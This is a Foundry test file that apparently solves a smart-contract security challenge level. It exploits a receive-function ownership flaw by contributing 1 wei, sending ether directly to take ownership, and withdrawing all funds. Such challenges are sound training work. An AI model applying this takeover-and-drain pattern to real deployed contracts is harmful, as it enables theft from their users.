// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Level01.sol";

contract Level01Test is Test {
    Level01 public level01;

    function setUp() public {
      vm.deal(vm.addr(2), 5 ether);
      vm.prank(vm.addr(1));
      level01 = new Level01();
    }

    function testLevel01() public {
      //CHeck who is the owner (1), we will be 2 and try to steal the ownership
      emit log_address(vm.addr(1));
      vm.prank(vm.addr(1));
      emit log_uint(level01.getContribution());
      vm.prank(vm.addr(1));

      emit log_address(level01.owner());

      vm.startPrank(vm.addr(2));
      emit log_uint(vm.addr(2).balance);

      //Contribute to appear into contributor
      level01.contribute{value: 1 wei}();
      emit log_uint(level01.getContribution());

      //call send money to trigger receive
      address(level01).call{value: 1 wei}("");

      //Check that we are now owner
      assertEq(level01.owner(), vm.addr(2));

      // Retreive everything
      level01.withdraw();
    }
}
